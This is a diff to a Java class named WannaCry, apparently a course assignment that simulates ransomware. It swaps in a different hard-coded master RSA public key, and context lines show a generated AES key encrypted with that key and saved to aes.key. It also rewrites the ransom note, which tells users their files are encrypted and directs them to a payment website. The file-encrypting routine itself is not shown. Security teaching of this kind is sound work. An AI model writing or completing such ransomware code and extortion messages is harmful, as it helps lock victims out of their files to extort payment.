@@ -6,15 +6,13 @@ import java.security.spec.*;
 import java.util.Base64;
 
 public class WannaCry {
-    // Master RSA public key (Base64 encoded) - used to encrypt AES key
+    // Master RSA public key (Base64 encoded) - provided by assignment
     private static final String MASTER_PUBLIC_KEY_B64 = 
-        "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAzS8c6up15w2Y3lRPx39Z" +
-        "yCaR9/1Cb1thfnXwpZfMW0S3rspwl7ChFeP0ivldzaiCrwsDsMPIYBm6mIRW6Awa" +
-        "9o4ISEKijGQSuqpC8petSs6wPhMqI0pX+wyoSilEvoUkAVsD/zznDgRvEwWTIcze" +
-        "BWd3cr2l74D6rDOpgsO+SnWU3kndLkkvIBchyN4vP/JABfbuXkbFAPVJmrx2eV19" +
-        "m1Ecv7lPT62mUF7wGCqEF4tgX4/jg4gYmvB9gu1OIRN4/uBcz6evqHrlKGOhmiHP" +
-        "dmNtDHndwkhe3a0CpldcatI+H8FSOxlFKnnlrdOvc4w8kr6pi8nCv61GPcqBql5W" +
-        "OQIDAQAB";
+        "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqW9Skh563WZyyNnXOz3kK8QZpuZZ3rIwnFpP" +
+        "qoymMIiHlLBfvDKlHzw1xWFTqISBLkgjOCrDnFDy/LZo8hTFWdXoxoSHvZo/tzNkVNObjulneQTy8TXd" +
+        "tcdPxHDa5EKjXUTjseljPB8rgstU/ciFPb/sFTRWR0BPb0Sj0PDPE/zHW+mjVfK/3gDT+RNAdZpQr6w1" +
+        "6YiQqtuRrQOQLqwqtt1Ak/Oz49QXaK74mO+6QGtyfIC28ZpIXv5vxYZ6fcnb1qbmaouf6RxvVLAHoX1e" +
+        "Wi/s2Ykur2A0jho41GGXt0HVxEQouCxho46PERCUQT1LE1dZetfJ4WT3L7Z6Q6BYuQIDAQAB";
 
     public static void main(String[] args) {
         try {
@@ -51,9 +49,13 @@ public class WannaCry {
             byte[] encryptedAesKey = rsaCipher.doFinal(aesKey.getEncoded());
             Files.write(Paths.get("aes.key"), encryptedAesKey);
             
-            System.out.println("Your files have been encrypted!");
-            System.out.println("To recover your files, you must pay the ransom.");
-            System.out.println("Contact us with your payment ID to receive the decryption key.");
+            // Display ransom message
+            System.out.println();
+            System.out.println("Dear User! Please note that your files have now been encrypted.");
+            System.out.println("To recover your files we ask you to follow the instructions");
+            System.out.println("in the website below to arrange a small payment:");
+            System.out.println("https://...");
+            System.out.println();
             
         } catch (java.nio.file.NoSuchFileException e) {
             System.err.println("Error: File not found - " + e.getFile());
